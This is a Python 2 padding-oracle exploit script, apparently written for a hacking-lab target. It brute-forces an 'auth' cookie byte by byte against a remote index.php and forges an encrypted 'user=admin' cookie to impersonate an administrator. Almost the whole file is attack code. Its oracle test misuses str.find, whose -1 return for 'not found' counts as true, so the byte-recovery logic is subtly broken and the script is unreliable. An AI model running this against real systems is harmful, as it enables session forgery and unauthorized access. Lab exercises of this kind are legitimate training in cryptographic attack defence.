#!/usr/bin/python

import os
import time
import requests
import base64
import urllib
import re

from Crypto.Cipher import DES
from Crypto import Random

# Set proxy
proxies = {'http': 'http://127.0.0.1:8080'}

# Set target url
target_url = "http://ptl-d045714f-4c2cb73c.libcurl.so/index.php"

# Set known cipher text in order to decrypt
cipher_text = "u7bvLewln6PJ670Gnj3hnGNX7vpdeyn4"

# Set padding list
padding_list = ['01', '02', '03', '04', '05', '06', '07', '08']

# Set plain text in order to encrypt
plain_text = 'user=admin'

# Break plain text to HEX list
plain_hex_list = re.findall('.{1,2}', plain_text.encode('hex'))
n_length = len(plain_hex_list)

# Break cipher text to HEX list
#cipher_hex = base64.b64decode(cipher_text).encode('hex')
#cipher_hex_list = re.findall('.{1,2}', cipher_hex)

# Get the number of Block
n_block = (n_length/8 + 1)

# Get the number of padding
n_padding = (n_block*8 - n_length)

# Padding the plain text
for i in range(0, n_padding):
	plain_hex_list.append(padding_list[n_padding-1])

c_list = ['00'] * 8
i_list = ['00'] * 8
tmp_e_list = ['00'] * (8 * n_block)
new_cipher_full = '00' * 8

# Brute force decrypt
for index in range(0, n_block):
	print 'Start block: ' + str(n_block-index) + ' out of ' + str(n_block)

	for i in range(0,256):
		tmp_e_list[7] = ("%0.2x" % i)
		payload_encoded = base64.b64encode("".join(tmp_e_list).decode('hex'))
		cookie = dict(auth=payload_encoded)

		r = requests.get(target_url, cookies = cookie)
		if r.text.find('Invalid padding'):
			print i
			i_list[7] = "%0.2x" % (int(tmp_e_list[7],16) ^ int(padding_list[0],16))
			break

	for i_padding in range(1, 8):
		print "i padding: "+str(i_padding)
		for x in range(0,i_padding):
			tmp_e_list[(7-x)] = "%0.2x" % (int(padding_list[i_padding],16) ^ int(i_list[(7-x)],16))
		for i in range(0,256):
			tmp_e_list[(7-i_padding)] = ("%0.2x" % i)		
			payload_encoded = base64.b64encode("".join(tmp_e_list).decode('hex'))
			cookie = dict(auth=payload_encoded)
			r = requests.get(target_url, cookies = cookie)

			if r.text.find('Invalid padding'):
				i_list[(7-i_padding)] = "%0.2x" % (int(tmp_e_list[(7-i_padding)],16) ^ int(padding_list[i_padding],16))
				break

	new_cipher = "%0.2x" % (int("".join(plain_hex_list[(n_block-index-1)*8:(n_block-index)*8]),16) ^ int("".join(i_list),16))
	print "Block " + str(n_block-index) + " Results:"
	print "[+] Intermediate Bytes (Hex): " + "".join(i_list)
	print "[+] Cipher Text (Hex): " + new_cipher
	tmp_e_list[(n_block-index-1)*8:(n_block-index)*8] = re.findall('.{1,2}', new_cipher)
	new_cipher_full = new_cipher + new_cipher_full

print "** Finished **"
print "[+] Encrypted value is: " + base64.b64encode(new_cipher_full.decode('hex'))
